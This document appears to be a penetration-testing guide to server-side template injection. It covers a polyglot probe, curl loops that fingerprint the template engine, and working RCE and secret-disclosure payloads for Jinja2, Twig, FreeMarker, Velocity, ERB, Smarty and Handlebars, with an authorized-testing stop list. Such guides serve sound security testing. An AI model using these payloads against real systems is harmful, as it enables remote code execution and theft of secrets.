# Server-Side Template Injection (SSTI) Testing

## Objective

Identify inputs that are embedded into server-side template engines without sanitization, allowing an attacker to execute template expressions that may lead to information disclosure, data exfiltration, or remote code execution.

---

## 1. Identify Injection Points

SSTI occurs wherever user input is embedded into a template at runtime:
- Error messages that include the user-supplied input
- Custom email templates with user-provided content
- Profile/bio fields rendered server-side
- Search results showing the search term
- Username/display name rendered in templates
- URL parameters reflected in page content
- Product names, report titles

---

## 2. Detection — Polyglot Probe

Start with a polyglot payload that triggers expression evaluation in multiple engines:

```bash
# Polyglot probe — triggers different engines
PROBE='${{<%[%'"'"'}}%\.'

curl -si "https://target/search?q=$PROBE" | grep -iE "error|exception|template|500"
```

If the response shows a template error → SSTI likely present.

---

## 3. Engine Identification via Math Expressions

Use math expressions to fingerprint the template engine:

```bash
BASE_URL="https://target/search?q="

# Test each expression
PAYLOADS=(
  '{{7*7}}'           # Twig, Jinja2, Pebble → 49
  '${7*7}'            # FreeMarker, Thymeleaf, Mako → 49
  '#{7*7}'            # Thymeleaf
  '<%= 7*7 %>'        # ERB (Ruby)
  '{{7*"7"}}'         # Twig → 49 (string*int = repeat), Jinja2 → error
  '${{"a".toUpperCase()}}' # FreeMarker
  '#{"a".toString()}'      # Spring EL
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
  RESP=$(curl -s "${BASE_URL}${ENCODED}" | grep -o "49\|error\|exception")
  echo "Payload [$PAYLOAD] → $RESP"
  sleep 0.2
done
```

---

## 4. Engine-Specific Payloads

### 4.1 Jinja2 (Python — Flask, Django)

**Detection:**
```
{{7*7}}           → 49
{{7*'7'}}         → Error (TypeError) — distinguishes from Twig
{{config}}        → reveals Flask config object
```

**Read internal config (PoC):**
```
{{config.items()}}
{{config['SECRET_KEY']}}
```

**RCE (PoC — confirm with safe command):**
```
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
```

```bash
# Safe Jinja2 SSTI PoC
PAYLOAD="{{config}}"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
curl -s "https://target/search?q=$ENCODED" | grep -iE "SECRET|DEBUG|DATABASE"
```

### 4.2 Twig (PHP — Symfony, Craft CMS)

**Detection:**
```
{{7*7}}          → 49
{{7*'7'}}        → 49  (Twig multiplies string * int = repeat)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**RCE via filter callback:**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{["id"]|map("system")|join}}
```

```bash
# Twig SSTI detection
PAYLOAD='{{7*"7"}}'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
curl -s "https://target/page?template=$ENCODED" | grep "49\|7777777"
```

### 4.3 FreeMarker (Java)

**Detection:**
```
${7*7}              → 49
${"freemarker.template.utility.Execute"?new()("id")}
```

**RCE PoC:**
```
${"freemarker.template.utility.Execute"?new()("id")}
```

### 4.4 Velocity (Java)

**Detection:**
```
#set($x=7*7)${x}    → 49
```

**RCE:**
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(
  $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"
)
```

### 4.5 ERB (Ruby — Rails)

**Detection:**
```
<%= 7*7 %>          → 49
<%= `id` %>         → RCE
```

### 4.6 Smarty (PHP)

**Detection:**
```
{$smarty.version}
{php}echo `id`;{/php}
```

### 4.7 Handlebars / Mustache (JavaScript — Node.js)

**Detection:**
```
{{7*7}}             → No evaluation (logic-less) — not injectable
{{constructor.constructor('return process.env')()}}  → Node.js code
```

```bash
# Node.js prototype chain RCE
PAYLOAD='{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString()"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
```

---

## 5. Safe RCE Confirmation Payloads

When RCE is achievable, use ONLY these safe confirmation commands:

```bash
# Confirm via time delay (safe — no output needed)
sleep 3
ping -c 3 127.0.0.1

# Confirm via OOB DNS
nslookup YOUR_COLLAB.burpcollaborator.net

# Confirm via output (minimum info)
id
whoami
hostname
```

**STOP after `id` output — do NOT:**
- Read sensitive files (`/etc/shadow`, `.env`, private keys)
- Establish reverse shells
- Create files on the system
- Execute network commands beyond OOB ping

---

## 6. SSTI Identification Decision Tree

```
Input reflected in response?
    No → Blind SSTI (use OOB/sleep)
    Yes ↓

{{7*7}} → 49?
    Yes ↓
{{7*'7'}} → 49?
    Yes → Twig (PHP)
    No  → Jinja2 (Python) or Pebble (Java)

${7*7} → 49?
    Yes ↓
${"freemarker.template.utility.Execute"?new()("id")} works?
    Yes → FreeMarker (Java)
    No  → Maybe Thymeleaf or Spring EL

<%= 7*7 %> → 49?
    Yes → ERB (Ruby)
```

---

## Evidence to Capture

- The input field / parameter
- The mathematical expression that evaluates (e.g., `{{7*7}}` → `49`)
- Engine fingerprint confirmation
- For RCE: screenshot of `id` output with process user
- Full HTTP request + response

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| SSTI confirmed (math eval) | Pass/Fail | High |
| SSTI → config/secret disclosure | Pass/Fail | Critical |
| SSTI → RCE (id/whoami) | Pass/Fail | Critical |
| Jinja2 SSTI | Pass/Fail | Critical |
| Twig SSTI | Pass/Fail | Critical |
| FreeMarker SSTI | Pass/Fail | Critical |
